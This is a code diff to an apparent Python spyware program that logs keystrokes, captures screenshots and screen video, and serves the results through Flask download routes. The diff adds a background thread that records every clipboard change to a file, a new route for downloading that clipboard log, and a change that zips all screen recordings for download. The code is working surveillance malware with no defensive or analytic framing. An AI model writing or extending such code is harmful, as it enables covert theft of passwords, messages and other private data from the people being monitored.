@@ -9,7 +9,7 @@ import numpy as np
 from mss import mss
 from cryptography.fernet import Fernet
 from flask import Flask, Response, send_file, send_from_directory
-
+import pyperclip
 
 app = Flask(__name__)
 
@@ -84,6 +84,31 @@ def screenshot_taker(interval=1):
         except Exception as e:
             print(f"Error taking screenshot: {e}")
 
+# Function to log clipboard content
+def clipboard_logging():
+    clipboard_logging.last_clipboard = pyperclip.paste()  # Initialize last clipboard content
+    print("Initial clipboard content:", clipboard_logging.last_clipboard)
+    try:
+        with open(os.path.join(current_dir, 'clipboard_logs.txt'), 'a') as f:
+            print("Clipboard log file successfully opened.")
+            pass  # Just open and close the file to ensure it exists
+        while True:
+            # Check if the clipboard content has changed
+            current_clipboard = pyperclip.paste()
+            print("Current clipboard content:", current_clipboard)
+            if current_clipboard != clipboard_logging.last_clipboard:
+                # Log the clipboard content along with a timestamp
+                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+                with open(os.path.join(current_dir, 'clipboard_logs.txt'), 'a') as f:
+                    f.write(f'{timestamp}: {current_clipboard}\n')
+                    f.flush()  # Flush the buffer to ensure data is written immediately
+                clipboard_logging.last_clipboard = current_clipboard
+                print("Clipboard content logged.")
+            time.sleep(2)  # Check clipboard every 1 second
+    except Exception as e:
+        print("Error logging clipboard content:", e)
+
+
 # Start logging keystrokes
 keyboard.on_release(log_keystrokes)
 
@@ -94,6 +119,10 @@ recording_thread.start()
 # Start taking screenshots
 screenshot_taker_thread = Thread(target=screenshot_taker)
 screenshot_taker_thread.start()
+
+# Start logging clipboard content
+clipboard_logging_thread = Thread(target=clipboard_logging)
+clipboard_logging_thread.start()
 
 # Function to generate screen stream
 def generate():
@@ -115,6 +144,11 @@ def screen_stream():
 def download_keystrokes():
     return send_from_directory(keystrokes_path, 'keystrokes.txt', as_attachment=True)
 
+# Route for downloading clipboard file 
+@app.route('/clipboard')
+def download_clipboard():
+    return send_from_directory(current_dir, 'clipboard_logs.txt', as_attachment=True)
+
 # Route for downloading the latest video recording
 @app.route('/video')
 def download_video():
@@ -122,17 +156,12 @@ def download_video():
     recording_flag = False  # Stop the recording
     time.sleep(2)  # Wait for 2 seconds to ensure recording stops
     try:
-        # Get the list of files in the video directory
-        files = os.listdir(video_path)
+         # Create a ZIP file containing all files in the videos directory
+        Zip_file = os.path.join(current_dir, 'videos.zip')
+        shutil.make_archive(os.path.splitext(Zip_file)[0], 'zip', video_path)
 
-        # Sort the files by modification time (newest first)
-        files.sort(key=lambda x: os.path.getmtime(os.path.join(video_path, x)), reverse=True)
-
-        # Get the path to the latest video file
-        latest_video = os.path.join(video_path, files[0])
-
-        # Send the latest video file as an attachment
-        return send_file(latest_video, as_attachment=True)
+        # Send the ZIP file as an attachment
+        return send_file(Zip_file, as_attachment=True)
     finally:
         # Restart the recording after the download is complete
         recording_thread = Thread(target=start_recording)
